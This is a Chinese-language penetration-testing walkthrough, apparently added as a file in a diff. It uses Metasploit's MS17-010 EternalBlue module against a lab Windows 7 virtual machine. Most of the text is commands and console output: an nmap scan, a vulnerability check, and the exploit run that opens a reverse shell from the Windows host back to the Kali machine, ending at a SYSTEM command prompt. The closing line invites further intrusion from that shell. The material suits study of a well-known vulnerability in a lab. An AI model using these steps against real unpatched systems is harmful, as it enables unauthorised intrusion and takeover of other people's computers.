@@ -1,0 +1,157 @@
+一.使用ms17-010（永恒之蓝）对win7进行渗透
+1.准备虚拟机两台：
+Kali
+Win7 64位 （要将防火墙关闭）
+kali的ip是 192.168.199.136
+win7的ip是192.168.199.137
+2.使用nmap获取靶机的开放端口以及系统版本
+nmap –sS –sV –Pn 192.168.0.101
+搜索结果如下{
+root@kali:~# nmap -sS -sV -Pn 192.168.199.137
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-23 22:39 EDT
+Stats: 0:00:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 33.33% done; ETC: 22:41 (0:00:42 remaining)
+Nmap scan report for 192.168.199.137
+Host is up (0.0012s latency).
+Not shown: 991 closed ports
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49158/tcp open  msrpc        Microsoft Windows RPC
+MAC Address: 00:0C:29:ED:5A:E2 (VMware)
+Service Info: Host: WIN-SRHE9V16J7H; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 72.17 seconds
+
+}
+可以获取到靶机开放了445端口
+3.启动msf
+输入msfconsole
+每次启动界面都不一样
+4.搜索ms17-010漏洞
+{
+msf5 > search ms17-010
+
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank     Check  Description
+   -  ----                                           ---------------  ----     -----  -----------
+   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   1  auxiliary/scanner/smb/smb_ms17_010                              normal   Yes    MS17-010 SMB RCE Detection
+   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+
+}可以获取到该漏洞有5个模块每个模块作用不一样
+1号模块能进行漏洞的分析，看看这个445端口是否能被入侵
+2号模块就是主要的攻击模块
+5.使用auxiliary/scanner/smb/smb_ms17_010（1号）模块分析该端口是否能被入侵
+{
+msf5 > use auxiliary/scanner/smb/smb_ms17_010
+msf5 auxiliary(scanner/smb/smb_ms17_010) >
+}
+6.查看该扫描模块的配置
+{
+f5 auxiliary(scanner/smb/smb_ms17_010) > show options
+
+Module options (auxiliary/scanner/smb/smb_ms17_010):
+
+   Name         Current Setting                                                 Required  Description
+   ----         ---------------                                                 --------  -----------
+   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
+   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
+   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
+   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+   RHOSTS                                                                       yes       The target address range or CIDR identifier
+   RPORT        445                                                             yes       The SMB service port (TCP)
+   SMBDomain    .                                                               no        The Windows domain to use for authentication
+   SMBPass                                                                      no        The password for the specified username
+   SMBUser                                                                      no        The username to authenticate as
+   THREADS      1                                                               yes       The number of concurrent threads
+
+}
+在Required那列中，yes的是必填的,no是选填的，
+默认帮我们已经写好了大部分的参数，
+但我们还是要手动设置一下RHOSTS的参数，
+即指定的主机ip，这里我们写被攻击的win7的ip
+7.在扫描模块中写入靶机的ip
+{
+msf5 auxiliary(scanner/smb/smb_ms17_010) > set rhosts 192.168.199.137
+rhosts => 192.168.199.137
+}
+8.接着输入run执行探测
+{
+msf5 auxiliary(scanner/smb/smb_ms17_010) > run
+
+[+] 192.168.199.137:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 192.168.199.137:445   - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+}
+看到[+]号那一行，他说这个主机很有可能具有ms17-010的漏洞
+这是就基本可以确认，ms17-010可以入侵该win7
+9.使用攻击模块
+{
+f5 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue
+msf5 exploit(windows/smb/ms17_010_eternalblue) >
+}
+使用这个模块，可以输入show targets看一下这个模块适用于哪些系统的主机
+{
+msf5 exploit(windows/smb/ms17_010_eternalblue) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+}
+可以适用于win7和win server 2008 r2的所有版本（没有装ms17-010补丁）
+10.设置靶机ip 进行攻击
+{
+msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.199.137
+rhosts => 192.168.199.137
+msf5 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 192.168.199.136:4444
+[+] 192.168.199.137:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 192.168.199.137:445 - Connecting to target for exploitation.
+[+] 192.168.199.137:445 - Connection established for exploitation.
+[+] 192.168.199.137:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 192.168.199.137:445 - CORE raw buffer dump (42 bytes)
+[*] 192.168.199.137:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 192.168.199.137:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 192.168.199.137:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
+[+] 192.168.199.137:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 192.168.199.137:445 - Trying exploit with 12 Groom Allocations.
+[*] 192.168.199.137:445 - Sending all but last fragment of exploit packet
+[*] 192.168.199.137:445 - Starting non-paged pool grooming
+[+] 192.168.199.137:445 - Sending SMBv2 buffers
+[+] 192.168.199.137:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 192.168.199.137:445 - Sending final SMBv2 buffers.
+[*] 192.168.199.137:445 - Sending last fragment of exploit packet!
+[*] 192.168.199.137:445 - Receiving response from exploit packet
+[+] 192.168.199.137:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 192.168.199.137:445 - Sending egg to corrupted connection.
+[*] 192.168.199.137:445 - Triggering free of corrupted buffer.
+[*] Command shell session 1 opened (192.168.199.136:4444 -> 192.168.199.137:49159) at 2020-08-23 22:58:13 -0400
+[+] 192.168.199.137:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.199.137:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.199.137:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+C:\Windows\system32>
+}
+程序就会运行，当看到WIN的时候，
+说明我们已经渗透进win7里面去了，
+按下回车出现了win7的cmd，这是已经是渗透成功了。
+但有时候不一定会成功，会返回FAIL，
+说明这个系统打了补丁，这个漏洞已经没有威力了。
+然后可以通过命令行来进行相关的入侵操作
